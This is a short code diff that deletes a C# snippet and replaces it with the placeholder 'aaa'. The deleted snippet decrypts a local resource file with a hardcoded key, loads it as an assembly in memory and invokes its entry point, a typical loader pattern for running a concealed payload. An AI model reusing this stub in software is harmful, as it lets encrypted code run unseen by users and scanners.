@@ -1,18 +1,1 @@
-string path = Path.Combine(Directory.GetCurrentDirectory(), "Resource1");
-        if (File.Exists(path))
-		{
-		var MyResource = File.ReadAllBytes(path);
-		byte[] A = MyResource;
-		string stringkey = "CodedSodaStream!";
-        byte[] key = Encoding.UTF8.GetBytes(stringkey);
-
-        byte[] Decbin = DecryptResource(A, key);
-        //byte[] s = Convert.FromBase64String(MyResource);
-        var assembly = Assembly.Load(Decbin);
-        string arguments = null;
-        assembly.EntryPoint.Invoke(null, new object[] { arguments });
-        }
-		else
-		{ Console.WriteLine("Resource file not found!");
-	
-		}
+aaa
